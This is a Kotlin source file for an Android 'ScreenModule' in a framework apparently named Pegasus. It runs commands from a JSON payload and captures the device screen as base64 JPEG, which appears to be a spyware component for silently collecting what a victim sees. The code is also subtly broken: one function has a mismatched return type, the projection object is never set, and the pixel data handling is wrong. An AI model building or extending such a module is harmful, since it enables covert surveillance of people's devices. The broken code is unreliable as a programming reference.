package com.pegasus.modules

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.HandlerThread
import com.pegasus.core.PegasusModule
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.Base64

class ScreenModule(private val context: Context) : PegasusModule {
    override val name = "screen"

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null

    override fun execute(payload: JSONObject): JSONObject {
        val action = payload.optString("action", "capture")
        val width = payload.optInt("width", 1080)
        val height = payload.optInt("height", 1920)
        val density = payload.optInt("density", 320)

        return when (action) {
            "capture" -> captureScreen(width, height, density)
            "stop" -> stopProjection()
            else -> JSONObject().put("error", "Unknown screen action")
        }
    }

    private fun captureScreen(width: Int, height: Int, density: Int): JSONObject {
        // Initialize projection if not already active
        if (mediaProjection == null) {
            initProjection(width, height, density)
        }

        // Wait a bit for the virtual display to be ready
        Thread.sleep(1000)

        // Capture the current image
        val image = imageReader?.acquireLatestImage()
        if (image == null) {
            return JSONObject().put("error", "No image available")
        }

        val plane = image.planes[0]
        val buffer = plane.buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        image.close()

        // Convert to JPEG (simplified - in production, use a proper image processor)
        val bitmap = bitmapFromByteArray(bytes, width, height)
        val stream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
        val encoded = Base64.getEncoder().encodeToString(stream.toByteArray())

        return JSONObject().put("image_base64", encoded)
    }

    private fun initProjection(width: Int, height: Int, density: Int) {
        handlerThread = HandlerThread("PegasusScreenThread").also { it.start() }
        handler = Handler(handlerThread!!.looper)

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

        val dm = context.getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
        val display = dm.getDisplay(DisplayManager.DEFAULT_DISPLAY)

        virtualDisplay = dm.createVirtualDisplay(
            "PegasusVirtualDisplay",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, handler
        )
    }

    private fun stopProjection() {
        virtualDisplay?.release()
        imageReader?.close()
        handlerThread?.quitSafely()
        mediaProjection = null
        virtualDisplay = null
        imageReader = null
        handlerThread = null
        handler = null
        return JSONObject().put("success", true)
    }

    private fun bitmapFromByteArray(bytes: ByteArray, width: Int, height: Int): Bitmap {
        val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
        bitmap.copyPixelsFromBuffer(java.nio.ByteBuffer.wrap(bytes))
        return bitmap
    }
}